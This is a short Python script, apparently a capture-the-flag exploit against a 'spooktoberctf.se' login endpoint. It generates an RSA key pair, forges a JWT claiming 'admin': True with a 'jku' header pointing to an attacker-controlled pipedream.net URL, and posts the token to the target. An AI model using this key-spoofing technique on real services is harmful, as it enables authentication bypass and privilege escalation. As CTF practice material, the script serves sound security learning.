import base64
import datetime
import json
import time

import requests
from jwcrypto import jwk
import jwt

key = jwk.JWK.generate(kty='RSA', size=2048, alg='RS256', use='sig', kid='k-IllUiseh7r95nhS-qnfYLgGlzJ4vN13aKrpopyeOk')
public_key = key.export_public(True)
pubstring = key.export_public()
private_key = key.export_private()
pub_pem = key.export_to_pem()
priv_pem = key.export_to_pem(True, None)

pub_pem_str = pub_pem.decode('ascii')
priv_pem_str = priv_pem.decode('ascii')
pub64 = base64.b64encode(pub_pem).decode('ascii')
priv64 = base64.b64encode(priv_pem).decode('ascii')




storage_dir = 'C:\\Users\\Erik\\jwt_tool\\'

with open(f'{storage_dir}sign.priv', mode='wb') as h:
    h.write(priv_pem)
with open(f'{storage_dir}sign.priv.json', mode='w') as h:
    h.write(key.export_private())
with open(f'{storage_dir}sign.pub', mode='wb') as h:
    h.write(pub_pem)
with open(f'{storage_dir}sign.pub.json', mode='w') as h:
    h.write(key.export_public())


spoof_jkws = json.dumps({'keys': [key.export_public()]})

# b64 = base64.b64encode(pem)


#test = key.

print()

headers = {
    'jwk': None,
    'typ': 'jwt'
}
headers = None
payload = {
    'iot': int(time.time()),
    'exp': int(time.mktime((datetime.datetime.now()+datetime.timedelta(1)).timetuple())),
    'admin': True,
    'subj': 'test',
    'jku': 'https://eoc8pvuz3mzrajb.m.pipedream.net/spooktoberctf.se'
}

token = jwt.encode(payload, headers=headers, key=private_key)
heads = jwt.get_unverified_header(token)
data = jwt.decode(token, algorithms=heads.get('alg'))

r = requests.post('http://spooktoberctf.se:22081/login', json={'jwt': token})
res = r.text

print()

